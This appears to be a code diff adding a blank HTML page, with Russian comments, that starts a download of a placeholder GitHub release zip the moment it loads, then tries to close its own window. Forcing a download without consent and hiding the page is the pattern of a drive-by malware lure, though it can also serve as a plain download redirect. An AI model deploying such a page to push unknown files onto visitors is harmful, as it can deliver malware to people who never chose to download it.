@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        body {
+            background: #000;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // ==========================================
+        // НАСТРОЙКИ
+        // ==========================================
+        const FILE_URL = "https://github.com/username/repo/releases/download/v1.0/file.zip";
+        const FILE_NAME = "file.zip";
+
+        // ==========================================
+        // ЗАПУСК СКАЧИВАНИЯ
+        // ==========================================
+        function download() {
+            const link = document.createElement('a');
+            link.href = FILE_URL;
+            link.download = FILE_NAME;
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // Пытаемся скачать сразу
+        window.addEventListener('load', () => {
+            download();
+
+            // Пытаемся закрыть окно через 500мс
+            setTimeout(() => {
+                window.close();
+            }, 500);
+
+            // Если окно не закрылось (браузер заблокировал),
+            // просто оставляем пустой чёрный экран
+        });
+    </script>
+</body>
+</html>
